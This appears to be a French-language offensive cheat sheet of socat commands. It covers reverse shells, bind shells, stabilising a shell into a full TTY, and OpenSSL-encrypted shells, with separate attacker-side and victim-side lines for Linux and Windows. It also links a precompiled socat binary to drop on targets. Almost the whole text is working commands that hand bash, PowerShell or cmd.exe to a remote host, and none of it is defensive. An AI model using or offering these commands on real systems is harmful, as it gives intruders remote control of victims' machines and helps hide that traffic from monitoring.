# Reverse shells

[Attaquant]
```
socat TCP-L:<port> -
```

Windows
```
socat TCP:<IP>:<PORT> EXEC:powershell.exe,pipes
```

Linux

```
socat TCP:<IP>:<PORT> EXEC:"bash -li"
```
<br>
<br>

# Bind Shells

Windows
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Linux
```
socat TCP-L:<PORT> EXEC:"bash -li"
```

[Attaquant]
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
<br>
<br>

### Stabiliser des shells avec socat

[Attaquant] target -> Linux
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

[Victime] <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">Socat précompilé</a>
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

<br>
<br>

### Shell encryptés !

Génération du certificat
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
```
cat shell.key shell.crt > shell.pem
```
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

[Victime]
```
socat OPENSSL:<IP>:<PORT>,verify=0 EXEC:/bin/bash
```
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

[Attaquant]
```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
